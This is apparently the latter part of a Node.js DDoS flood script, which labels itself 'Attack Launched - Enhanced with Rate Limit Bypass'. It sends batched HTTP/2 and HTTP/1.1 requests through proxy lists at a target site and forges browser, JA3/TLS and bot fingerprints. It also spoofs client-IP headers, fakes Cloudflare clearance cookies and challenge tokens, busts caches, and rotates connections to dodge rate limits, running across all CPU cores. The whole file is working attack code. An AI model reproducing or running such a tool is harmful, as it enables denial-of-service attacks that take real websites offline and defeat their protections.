    'Twitterbot/1.0',
    'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
    'Slackbot',
    'Discordbot/2.0 (+https://discordapp.com)',
    'DiscordBot (private use)',
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
    'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
    'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)',
    'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
    'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
    'Mozilla/5.0 (compatible; Google-Extended/1.0; +https://developers.google.com/search/docs/crawling-indexing/google-extended)',
    'Mozilla/5.0 (compatible; Pinterestbot/1.0; +https://www.pinterest.com/bot.html)',
    'Mozilla/5.0 (compatible; ClaudeBot/1.0; +claude.ai)'
];


const uaCache = new Map();

const proxyJA3Cache = new Map();
function getJA3ForProxy(proxyHost) {
  if (!proxyJA3Cache.has(proxyHost)) {
    const browserType = ['chrome', 'firefox', 'edge'][Math.floor(Math.random() * 3)];
    const profile = browserProfiles[browserType];
    const ja3Fingerprint = {
      ciphers: shuffle(profile.ciphers.slice()).slice(0, getRandomInt(8, profile.ciphers.length)),
      signatureAlgorithms: shuffle(profile.signatureAlgorithms.slice()).slice(0, getRandomInt(6, profile.signatureAlgorithms.length)),
      curves: shuffle(profile.curves.slice()),
      extensions: shuffle(profile.extensions.slice()).slice(0, getRandomInt(10, profile.extensions.length)),
      padding: Math.random() > 0.3 ? getRandomInt(0, 100) : 0
    };
    proxyJA3Cache.set(proxyHost, { browserType, ja3Fingerprint });
  }
  return proxyJA3Cache.get(proxyHost);
}

const fingerprintCache = new Map();
function getCachedFingerprint(browserType, ja3Fingerprint) {
  const key = `${browserType}_${ja3Fingerprint.ciphers[0]}`;
  if (!fingerprintCache.has(key)) {
    fingerprintCache.set(key, generateBrowserFingerprint(browserType, ja3Fingerprint));
    if (fingerprintCache.size > 1000) {
      const firstKey = fingerprintCache.keys().next().value;
      fingerprintCache.delete(firstKey);
    }
  }
  return fingerprintCache.get(key);
}

// new logic
const hpackEncodingCache = new Map();
const MAX_HPACK_CACHE = 500;
function getCachedHPACK(hpack, headers) {
  const keyHeaders = headers.filter(h => 
    h[0] === ':method' || h[0] === ':path' || h[0] === 'user-agent'
  );
  const key = keyHeaders.map(h => `${h[0]}:${h[1]}`).join('|');
  if (hpackEncodingCache.has(key)) {
    return hpackEncodingCache.get(key);
  }
  const encoded = hpack.encode(headers);
  if (hpackEncodingCache.size >= MAX_HPACK_CACHE) {
    const firstKey = hpackEncodingCache.keys().next().value;
    hpackEncodingCache.delete(firstKey);
  }
  hpackEncodingCache.set(key, encoded);
  return encoded;
}

// Dynamic Headers Cache
const headersByUA = new Map();


function getHeadersFast(fingerprint) {
      const ua = fingerprint.navigator.userAgent;
        const timeSlot = Math.floor(Date.now() / 30000);
          const cacheKey = `${ua}_${timeSlot}`;
            
              if (!headersByUA.has(cacheKey)) {
                  headersByUA.set(cacheKey, generateDynamicHeaders(fingerprint));
                      
                          if (headersByUA.size > 100) {
                                const oldKeys = Array.from(headersByUA.keys()).slice(0, headersByUA.size - 100);
                                      oldKeys.forEach(k => headersByUA.delete(k));
                                          }
                                            }
                                              
                                                return headersByUA.get(cacheKey);
                                                }



const frameBufferPool = [];
const MAX_POOL_SIZE = 100;
function getFrameBuffer(size) {
  if (frameBufferPool.length > 0) {
    const buf = frameBufferPool.pop();
    if (buf.length >= size) return buf.slice(0, size);
  }
  return Buffer.allocUnsafe(size);
}
function releaseFrameBuffer(buffer) {
  if (frameBufferPool.length < MAX_POOL_SIZE && buffer.length <= 16384) {
    frameBufferPool.push(buffer);
  }
}

function getCachedUA(browserType, isMobile, fakeBot, rdversion) {
    const cacheKey = `${browserType}_${isMobile}_${fakeBot}_${rdversion}`;
    
    if (uaCache.has(cacheKey)) {
        return uaCache.get(cacheKey);
    }
    
    let userAgent;
    if (fakeBot) {
        userAgent = botUserAgents[Math.floor(Math.random() * botUserAgents.length)];
    } else {
        if (browserType === 'chrome') {
            const chromeDesktopUAs = [
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`,
                `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`,
                `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`
            ];
            
            const chromeMobileUAs = [
                `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${rdversion}.0.0.0 Mobile/15E148 Safari/604.1`,
                `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Mobile Safari/537.36`,
                `Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${rdversion}.0.0.0 Mobile/15E148 Safari/604.1`
            ];
            
            userAgent = isMobile 
                ? chromeMobileUAs[Math.floor(Math.random() * 3)] 
                : chromeDesktopUAs[Math.floor(Math.random() * 3)];
        } else if (browserType === 'firefox') {
            const firefoxDesktopUAs = [
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${rdversion}.0) Gecko/20100101 Firefox/${rdversion}.0`,
                `Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:${rdversion}.0) Gecko/20100101 Firefox/${rdversion}.0`,
                `Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:${rdversion}.0) Gecko/20100101 Firefox/${rdversion}.0`
            ];
            
            const firefoxMobileUAs = [
                `Mozilla/5.0 (Android 14; Mobile; rv:${rdversion}.0) Gecko/${rdversion}.0 Firefox/${rdversion}.0`,
                `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/${rdversion}.0 Mobile/15E148 Safari/605.1.15`
            ];
            
            userAgent = isMobile 
                ? firefoxMobileUAs[Math.floor(Math.random() * 2)] 
                : firefoxDesktopUAs[Math.floor(Math.random() * 3)];
        } else if (browserType === 'edge') {
            const edgeDesktopUAs = [
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36 Edg/${rdversion}.0.0.0`,
                `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36 Edg/${rdversion}.0.0.0`
            ];
            
            const edgeMobileUAs = [
                `Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Mobile Safari/537.36 EdgA/${rdversion}.0.0.0`,
                `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/${rdversion}.0.0.0 Mobile/15E148 Safari/605.1.15`
            ];
            
            userAgent = isMobile 
                ? edgeMobileUAs[Math.floor(Math.random() * 2)] 
                : edgeDesktopUAs[Math.floor(Math.random() * 2)];
        }
    }
    
    uaCache.set(cacheKey, userAgent);
    return userAgent;
}
function generateBrowserFingerprint(browserType, ja3Fingerprint) {
//update 2026
    // Phân loại version theo từng trình duyệt để phù hợp 
    let rdversion;
    if (browserType === 'chrome') {
        rdversion = getRandomInt(140, 143);
    } else if (browserType === 'firefox') {
        rdversion = getRandomInt(144, 146);
    } else if (browserType === 'edge') {
        rdversion = getRandomInt(120, 123);
    }
    const isMobile = Math.random() > 0.5;
    const screenSizes = isMobile ? mobileScreenSizes : desktopScreenSizes;
    const webGLVendors = isMobile ? mobileWebGLVendors : desktopWebGLVendors;
    
    const userAgent = getCachedUA(browserType, isMobile, fakeBot, rdversion);
    
    let sextoy;
    if (fakeBot) {
        sextoy = '"Not A;Brand";v="99", "Chromium";v="130"';
    } else {
        if (browserType === 'chrome') {
            sextoy = `"Google Chrome";v="${rdversion}", "Chromium";v="${rdversion}", "Not?A_Brand";v="24"`;
        } else if (browserType === 'firefox') {
            sextoy = `"Firefox";v="${rdversion}", "Gecko";v="${rdversion}"`;
        } else if (browserType === 'edge') {
            sextoy = `"Microsoft Edge";v="${rdversion}", "Chromium";v="${rdversion}", "Not?A_Brand";v="24"`;
        }
    }
    
    const screen = screenSizes[Math.floor(Math.random() * screenSizes.length)];
    const selectedWebGL = webGLVendors[Math.floor(Math.random() * webGLVendors.length)];
    
    let hardwareConcurrency, deviceMemory, maxTouchPoints;
    if (browserType === 'chrome') {
        hardwareConcurrency = isMobile ? [2, 4][Math.floor(Math.random() * 2)] : [4, 8, 12][Math.floor(Math.random() * 3)];
        deviceMemory = isMobile ? 2 : 8;
        maxTouchPoints = isMobile ? getRandomInt(1, 5) : 0;
    } else if (browserType === 'firefox') {
        hardwareConcurrency = isMobile ? [2, 4][Math.floor(Math.random() * 2)] : [4, 6, 8][Math.floor(Math.random() * 3)];
        deviceMemory = isMobile ? 2 : 4;
        maxTouchPoints = isMobile ? getRandomInt(1, 5) : 0;
    } else if (browserType === 'edge') {
        hardwareConcurrency = isMobile ? [2, 4][Math.floor(Math.random() * 2)] : [8, 12, 16][Math.floor(Math.random() * 3)];
        deviceMemory = isMobile ? 4 : 8;
        maxTouchPoints = isMobile ? getRandomInt(1, 5) : 0;
    }
    
    const canvasSeed = crypto.createHash('md5').update(userAgent + 'canvas_seed').digest('hex');
    const canvasFingerprint = canvasSeed.substring(0, 8);
    const webglFingerprint = crypto.createHash('md5').update(selectedWebGL.vendor + selectedWebGL.renderer).digest('hex').substring(0, 8);
    
    const tlsVersions = ['771', '772', '773'];
    const version = tlsVersions[Math.floor(Math.random() * tlsVersions.length)];
    const cipher = ja3Fingerprint.ciphers.join(':');
    const extension = ja3Fingerprint.extensions.join('-');
    const curve = ja3Fingerprint.curves.join('-');
    const ja3 = `${version},${cipher},${extension},${curve},0`;
    const ja3Hash = crypto.createHash('md5').update(ja3).digest('hex');
    
    return {
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.width,
            availHeight: screen.height - (isMobile ? 0 : getRandomInt(20, 100)),
            colorDepth: 24,
            pixelDepth: 24
        },
        navigator: {
            language: languages[Math.floor(Math.random() * languages.length)],
            languages: ['en-US', 'en'],
            doNotTrack: Math.random() > 0.7 ? "1" : "0",
            hardwareConcurrency: hardwareConcurrency,
            userAgent: userAgent,
            sextoy: sextoy,
            deviceMemory: deviceMemory,
            maxTouchPoints: maxTouchPoints,
            webdriver: false,
            cookiesEnabled: true
        },
        plugins: [],
        timezone: -Math.floor(Math.random() * 12) * 60,
        webgl: {
            vendor: selectedWebGL.vendor,
            renderer: selectedWebGL.renderer,
            fingerprint: webglFingerprint
        },
        canvas: canvasFingerprint,
        userActivation: Math.random() > 0.5,
        localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
        ja3: ja3Hash,
        touchSupport: { maxTouchPoints: maxTouchPoints, touchEvent: isMobile, touchStart: isMobile }
    };
}

function colorizeStatus(status, count) {
    const greenStatuses = ['200', '404'];
    const redStatuses = ['403', '429', '401'];
    const yellowStatuses = ['503', '502', '522', '520', '521', '523', '524', '500'];

    let coloredStatus;
    if (greenStatuses.includes(status)) {
        coloredStatus = chalk.green.bold(status);
    } else if (redStatuses.includes(status)) {
        coloredStatus = chalk.red.bold(status);
    } else if (yellowStatuses.includes(status)) {
        coloredStatus = chalk.yellow.bold(status);
    } else {
        coloredStatus = chalk.gray.bold(status);
    }

    const underlinedCount = chalk.underline(count);

    return `${coloredStatus}: ${underlinedCount}`;
}

const connectionLifecycles = new Map();

function initConnectionLifecycle(proxyHost) {
  const lifecycle = {
      maxRequests: getRandomInt(80, 150),
          maxDuration: getRandomInt(45000, 90000),
              startTime: Date.now(),
                  requestCount: 0
                    };
                      connectionLifecycles.set(proxyHost, lifecycle);
                        return lifecycle;
                        }

                        function checkConnectionLifecycle(proxyHost) {
                          const lifecycle = connectionLifecycles.get(proxyHost);
                            if (!lifecycle) return false;
                              
                                lifecycle.requestCount++;
                                  const elapsed = Date.now() - lifecycle.startTime;
                                    
                                      if (lifecycle.requestCount >= lifecycle.maxRequests || elapsed >= lifecycle.maxDuration) {
                                          return true;
                                            }
                                              return false;
                                              }

                                              function cleanupConnectionLifecycle(proxyHost) {
                                                connectionLifecycles.delete(proxyHost);
                                                }

                                                setInterval(() => {
                                                  const now = Date.now();
                                                    for (const [proxyHost, lifecycle] of connectionLifecycles) {
                                                        if (now - lifecycle.startTime > 120000) {
                                                              connectionLifecycles.delete(proxyHost);
                                                                  }
                                                                    }
                                                                    }, 120000);

async function go() {
    let proxyLine;
    let attempts = 0;
    
    do {
        proxyLine = proxy[~~(Math.random() * proxy.length)];
        const [proxyHost] = proxyLine.split(':');
        
        if (enableRatelimitBypass && checkRateLimit(proxyHost)) {
            attempts++;
            if (attempts >= 5) {
                setTimeout(go, 50);
                return;
            }
            continue;
        }
        break;
    } while (true);
    
    let proxyHost, proxyPort, proxyUser, proxyPass;
    if (authProxyFlag) {
        [proxyHost, proxyPort, proxyUser, proxyPass] = proxyLine.split(':');
    } else {
        [proxyHost, proxyPort] = proxyLine.split(':');
    }

    if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
        setTimeout(go, 50);
        return;
    }

    const browserType = ['chrome', 'firefox', 'edge'][Math.floor(Math.random() * 3)];
    const profile = browserProfiles[browserType];
    
    const ja3Fingerprint = {
        ciphers: shuffle(profile.ciphers.slice()).slice(0, getRandomInt(8, profile.ciphers.length)),
        signatureAlgorithms: shuffle(profile.signatureAlgorithms.slice()).slice(0, getRandomInt(6, profile.signatureAlgorithms.length)),
        curves: shuffle(profile.curves.slice()),
        extensions: shuffle(profile.extensions.slice()).slice(0, getRandomInt(10, profile.extensions.length)),
        padding: Math.random() > 0.3 ? getRandomInt(0, 100) : 0
    };
    
    const fingerprint = generateBrowserFingerprint(browserType, ja3Fingerprint);
      const lifecycle = initConnectionLifecycle(proxyHost);
    let tlsSocket;

    const netSocket = net.connect({
        host: proxyHost,
        port: Number(proxyPort),
        keepAlive: true,
        keepAliveMsecs: 10000
    }, () => {
        netSocket.once('data', () => {
            proxyConnections++;
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2'],
                servername: url.host,
                ciphers: ja3Fingerprint.ciphers.join(':'),
                sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
                secureOptions: 
                    crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_TLSv1 |
                    crypto.constants.SSL_OP_NO_TLSv1_1 |
                    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                    crypto.constants.SSL_OP_NO_COMPRESSION,
                secure: true,
                session: crypto.randomBytes(64),
                sessionTimeout: 300,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                ecdhCurve: ja3Fingerprint.curves.join(':'),
                supportedVersions: ['TLSv1.3', 'TLSv1.2'],
                supportedGroups: ja3Fingerprint.curves.join(':'),
                applicationLayerProtocolNegotiation: ja3Fingerprint.extensions.includes('16') ? ['h2'] : ['h2'],
                rejectUnauthorized: false,
                keepAlive: true,
                keepAliveMsecs: 10000,
                noDelay: true
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }

                    function mainH1() {  
                        const method = enableCache ? getRandomMethod() : reqmethod;
                        const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                        const h1payl = `${method} ${path}${url.search || ''}${postdata ? `?${postdata}` : ''} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: ${fingerprint.navigator.userAgent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: ${fingerprint.navigator.language}\r\n${enableCache ? 'Cache-Control: no-cache, no-store, must-revalidate\r\n' : ''}${hcookie ? `Cookie: ${hcookie}\r\n` : ''}${currentRefererValue ? `Referer: ${currentRefererValue}\r\n` : ''}${generateAuthorizationHeader(authValue) ? `Authorization: ${generateAuthorizationHeader(authValue)}\r\n` : ''}${customHeaders ? customHeaders.split('#').map(h => { const [n, v] = h.split(':'); return `${n.trim()}: ${v.trim()}\r\n`; }).join('') : ''}Connection: keep-alive\r\n\r\n`; // @Zentra999
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    mainH1();
                                }, isFull ? 300 : 300 / ratelimit);
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                    }

                    mainH1();

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy());
                    });
                    return;
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(http2Fingerprint.HEADER_TABLE_SIZE);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);
                const frames1 = [];
                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, http2Fingerprint.HEADER_TABLE_SIZE],
                        [2, http2Fingerprint.ENABLE_PUSH],
                        [3, http2Fingerprint.MAX_CONCURRENT_STREAMS],
                        [4, http2Fingerprint.INITIAL_WINDOW_SIZE],
                        [5, http2Fingerprint.MAX_FRAME_SIZE],
                        [6, http2Fingerprint.MAX_HEADER_LIST_SIZE],
                        [8, http2Fingerprint.ENABLE_CONNECT_PROTOCOL]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];
                frames1.push(...frames);

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);

                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];
                                          // === Check connection lifecycle ===
                                                    if (checkConnectionLifecycle(proxyHost)) {
                                                                if (debugMode) {
                                                                              //console.log(`[Lifecycle] Rotating ${proxyHost} (${lifecycle.requestCount} reqs)`);
                                                                                          }
                                                                                                      tlsSocket.write(encodeFrame(0, 7, Buffer.from([0, 0, 0, 0])));
                                                                                                                  tlsSocket.end(() => {
                                                                                                                                tlsSocket.destroy();
                                                                                                                                              cleanupConnectionLifecycle(proxyHost);
                                                                                                                                                            setTimeout(go, getRandomInt(200, 600));
                                                                                                                                                                        });
                                                                                                                                                                                    return;
                                                                                                                                                                                              }

                                if (enableRatelimitBypass && status == 429) {
                                    markRateLimited(proxyHost);
                                    if (closeOnError) {
                                        tlsSocket.write(encodeRstStream(0));
                                        tlsSocket.end(() => tlsSocket.destroy());
                                        netSocket.end(() => netSocket.destroy());
                                        applyBackoff(backoffConfig.on429, 1).catch(() => {});
                                        return;
                                    }
                                }
                                
                                if (closeOnError && (status == 403 || status == 429)) {
                                    tlsSocket.write(encodeRstStream(0));
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    netSocket.end(() => netSocket.destroy());
                                }
                                
                                if (!statuses[status])
                                    statuses[status] = 0;

                                statuses[status]++;
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {
                                        if (!statuses['GOAWAY'])
                                            statuses['GOAWAY'] = 0;

                                        statuses['GOAWAY']++;
                                    }
                                    

                                    if (enableRatelimitBypass) {
                                        applyBackoff(backoffConfig.onGoaway, 1).catch(() => {});
                                    }
                                }

                                tlsSocket.write(encodeRstStream(0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else {
                            break;
                        }
                    }
                });

                tlsSocket.write(Buffer.concat(frames1));
                
                async function main() {  
                    if (tlsSocket.destroyed) {
                        return;
                    }
                    
                    const batchSize = isFull ? Math.min(20, ratelimit) : 1; 
                    const requestsPerBatch = Math.max(1, Math.floor(ratelimit / batchSize));
                    
                    for (let batch = 0; batch < batchSize; batch++) {
                        const requests = [];
                        const startTime = Date.now();
                        const customHeadersArray = [];
                        
                        if (customHeaders) {
                            customHeaders.split('#').forEach(header => {
                                const [name, value] = header.split(':').map(part => part?.trim());
                                if (name && value) customHeadersArray.push({ [name.toLowerCase()]: value });
                            });
                        }

                        for (let i = 0; i < requestsPerBatch; i++) {
                            const method = enableCache ? getRandomMethod() : reqmethod;
                            const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                            const pseudoHeaders = [
                                [":method", method],
                                [":authority", url.hostname],
                                [":scheme", "https"],
                                [":path", path],
                            ];

                            const regularHeaders = getHeadersFast(fingerprint).filter(a => a[1] != null);
                            const additionalRegularHeaders = Object.entries({
                                ...(Math.random() > 0.6 && { "priority": "u=0, i" }),
                                //...(Math.random() > 0.4 && { "dnt": "1" }),
                                ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                            }).filter(a => a[1] != null);

                            const allRegularHeaders = [...regularHeaders, ...additionalRegularHeaders];
                            shuffle(allRegularHeaders);

                            const combinedHeaders = [
                                ...pseudoHeaders,
                                ...allRegularHeaders,
                                ['cookie', generateCfClearanceCookie(fingerprint)],
                                ...generateChallengeHeaders(fingerprint),
                                ...customHeadersArray.reduce((acc, header) => [...acc, ...Object.entries(header)], [])
                            ];
                            const packed = Buffer.concat([
                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                getCachedHPACK(hpack, combinedHeaders)
                            ]);
                           // const packed = getCachedHPACK(hpack, combinedHeaders);
                            
                            requests.push(encodeFrame(streamId, 1, packed, 0x25));
                            streamId += 2;
                        }

                        // SEND BATCH REQUESTS
                        if (requests.length > 0) {
                            tlsSocket.write(Buffer.concat(requests), (err) => {
                                if (err) {
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    return;
                                }
                            });
                        }
                        
                        const elapsed = Date.now() - startTime;
                        const batchDelay = Math.max(10, (100 / batchSize) - elapsed); 
                        
                        if (batch < batchSize - 1) {
                            await sleep(batchDelay);
                        }
                    }
                    

                    const nextDelay = Math.max(50, 300 / ratelimit); 
                    setTimeout(() => main(), nextDelay);
                }
                main();
            }).on('error', () => {
                tlsSocket.destroy();
            });
        });
        const currentIP = generateUniqueIP();
        let connectRequest = `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nConnection: Keep-Alive\r\nClient-IP: ${currentIP}\r\nX-Client-IP: ${currentIP}\r\nVia: 1.1 ${currentIP}`;
        if (authProxyFlag && proxyUser && proxyPass) {
            const auth = Buffer.from(`${proxyUser}:${proxyPass}`).toString('base64');
            connectRequest += `\r\nProxy-Authorization: Basic ${auth}`;
        }
        connectRequest += `\r\n\r\n`;
        netSocket.write(connectRequest);

    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go(); });
        }
    });

    netSocket.on('error', (error) => {
        cleanup(error);
    });
    
    netSocket.on('close', () => {
        cleanup();
    });
    
    function cleanup(error) {
            cleanupConnectionLifecycle(proxyHost);
        if (error) {
            setTimeout(go, getRandomInt(50, 200));
        }
        if (netSocket) {
            netSocket.destroy();
        }
        if (tlsSocket) {
            tlsSocket.end();
        }
    }
}
function handleQuery(query) {
    if (query === '1') {
        return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
        return url.pathname + `?${randomPathSuffix}`;
    } else if (query === '3') {
        return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    }
    return url.pathname;
}

function getCPUUsage() {
    const cpus = os.cpus();
    let totalIdle = 0, totalTick = 0;
    
    cpus.forEach(cpu => {
        for (let type in cpu.times) {
            totalTick += cpu.times[type];
        }
        totalIdle += cpu.times.idle;
    });
    
    const idle = totalIdle / cpus.length;
    const total = totalTick / cpus.length;
    const usage = 100 - ~~(100 * idle / total);
    
    return usage.toFixed(2);
}

function getRAMUsage() {
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const ramUsage = (usedMem / totalMem) * 100;
    
    return ramUsage.toFixed(2);
}

function generateCacheQuery() {
    const cacheBypassQueries = [
        `?v=${Math.floor(Math.random() * 1000000)}`,
        `?_=${Date.now()}`,
        `?cachebypass=${randstr(8)}`,
        `?ts=${Date.now()}_${randstr(4)}`,
        `?cb=${crypto.randomBytes(4).toString('hex')}`,
        `?rnd=${generateRandomString(5, 10)}`,
        `?param1=${randstr(4)}&param2=${crypto.randomBytes(4).toString('hex')}&rnd=${generateRandomString(3, 8)}`,
        `?cb=${randstr(6)}&ts=${Date.now()}&extra=${randstr(5)}`,
        `?v=${encodeURIComponent(randstr(8))}&cb=${Date.now()}`,
        `?param=${randstr(5)}&extra=${crypto.randomBytes(8).toString('base64')}`,
        `?ts=${Date.now()}&rnd=${generateRandomString(10, 20)}&hash=${crypto.createHash('md5').update(randstr(10)).digest('hex').slice(0,8)}`
    ];
    return cacheBypassQueries[Math.floor(Math.random() * cacheBypassQueries.length)];
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 30) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;

        timer = 0;
    }
}, 10000);


setInterval(() => {
    cleanupRateLimitMap();
}, 30000);

if (cluster.isMaster) {
    const cpu = getCPUUsage();
    const ram = getRAMUsage();
    const workers = {};

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Attack Launched - Enhanced with Rate Limit Bypass`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });
    if (debugMode) {
        setInterval(() => {
            let statuses = {};
            let totalConnections = 0;
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (code !== 'proxyConnections') {
                                if (statuses[code] == null)
                                    statuses[code] = 0;
                                statuses[code] += st[code];
                            }
                        }
                        totalConnections += st.proxyConnections || 0;
                    }
                }
            }
            const statusString = Object.entries(statuses)
                .map(([status, count]) => colorizeStatus(status, count))
                .join(', ');
            console.clear();
            console.log(`(${chalk.magenta.bold('JSBYPASS')}) | Date: (${chalk.blue.bold(new Date().toLocaleString('en-US'))}) | Time: (${time}s) | Remaining: (${chalk.green.bold(Math.max(0, time - Math.floor((Date.now() - startTime) / 1000)))}s) | Status: (${statusString}) | Connections: (${chalk.cyan.bold(totalConnections)}) | CPU: (${chalk.red.bold(cpu)}%) | Ram: (${chalk.yellow.bold(ram)}%)`);
            proxyConnections = 0;
        }, 1000);
    }

    if (!connectFlag) {
        setTimeout(() => process.exit(1), time * 1000);
    }
} else {
    if (connectFlag) {
        setInterval(() => {
            go();
        }, delay);
    } else {
        let consssas = 0;
        let someee = setInterval(() => {
            if (consssas < 50000) {
                consssas++;
            } else {
                clearInterval(someee);
                return;
            }
            go();
        }, delay);
    }
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift();

            statusesQ.push({ ...statuses, proxyConnections });
            statuses = {};
            proxyConnections = 0;
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
}
